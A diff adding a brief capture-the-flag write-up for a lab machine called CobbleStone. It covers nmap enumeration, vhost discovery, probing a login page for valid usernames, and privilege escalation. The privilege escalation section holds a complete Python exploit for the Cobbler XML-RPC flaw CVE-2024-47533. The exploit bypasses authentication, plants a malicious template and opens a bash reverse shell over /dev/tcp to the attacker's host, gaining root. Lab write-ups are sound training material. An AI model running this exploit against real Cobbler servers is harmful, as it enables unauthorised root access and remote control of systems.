@@ -1,0 +1,100 @@
+[Profile]{
+Machine: CobbleStone
+ip: 10.129.232.170
+OS: Linux
+}
+
+[Enumeration]{
+nmap -sC -sV -Pn -p- 10.129.232.170 -oN nmap_CS
+|22/ssh 80/http
+nmap -sU -sC 10.129.232.170
+68/dhcp 69 tftp
+
+Going on the webpage, we discover some vhosts vote, deploy, mc  that we add to look into.
+(Furthermore it seems to be developped with this
+<!-- Proudly coded by Billy (https://bybilly.uk) -->
+<!-- Version: 1.9.2 -->)
+
+On the deploy vhost, we discover sensitive info about the team members( their names and their roles ).
+
+It seems to have this sort of architecture..
+js                      
+templates               
+css                     
+img                     
+db                      
+javascript              
+skins                   
+.                       
+vendor
+What could be interesting here is db right ?
+But to access all that we have to login or register.
+Let's try to login with some obvious cred and see how the login page works,
+It seems to check the user first then check the password, it could be useful to valid some usernames like admin
+Let's register now and see what it is about !
+
+}
+
+[Exploitation]{
+Here an idea could be to find a way to suggest a skin which could launch rce or reverse shell
+
+}
+
+[PrivEsc]{
+Here, we use the Cobbler api, cve-2024-47533, and a python exploit to get a reverse shell as root.
+```Python
+import xmlrpc.client
+
+TARGET = "http://127.0.0.1:25151/RPC2"
+LHOST, LPORT = "10.10.16.236", "7777"
+
+# Expression-only Cheetah payload that won't break parsing:
+payload = f"""#set $null = __import__('os').system('bash -c "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"')
+# Kickstart minimal skeleton (keeps Cobbler happy)
+lang en_US
+keyboard us
+network --bootproto=dhcp
+rootpw  --plaintext cobbler
+timezone UTC
+bootloader --location=mbr
+clearpart --all --initlabel
+autopart
+reboot
+"""
+
+s = xmlrpc.client.ServerProxy(TARGET)
+t = s.login("", -1)  # CVE-2024-47533
+
+# (Re)write the malicious template (avoid #python/#end python)
+s.write_autoinstall_template("pwn.ks", payload, t)
+
+#Create the distro
+did = s.new_distro(t) 
+s.modify_distro(did,"name","pwn_distro",t)
+s.modify_distro(did,"arch","x86_64",t)
+s.modify_distro(did,"breed","redhat",t)
+#s.modify_distro(did,"kernel","/boot/vmlinuz-6.10-37-amd64",t)
+#s.modify_distro(did,"initrd","/boot/initrd.img-6.10-37-amd64",t)
+#s.save_distro(did,t)
+
+
+# Create/adjust the profile, link distro, set our template
+try:
+    pid = s.new_profile(t)
+    s.modify_profile(pid, "name", "pwnprof", t)
+except xmlrpc.client.Fault:
+    pid = s.get_profile("pwnprof", t)
+
+s.modify_profile(pid, "distro", "pwn_distro", t)
+s.modify_profile(pid, "autoinstall", "pwn.ks", t)
+s.modify_profile(pid, "kickstart",   "pwn.ks", t)
+s.save_profile(pid, t)
+
+# Render (no token arg)
+print(s.generate_profile_autoinstall("pwnprof"))
+```
+
+And we got our reverse shell fine !
+Got the root.txt ~-~
+
+}
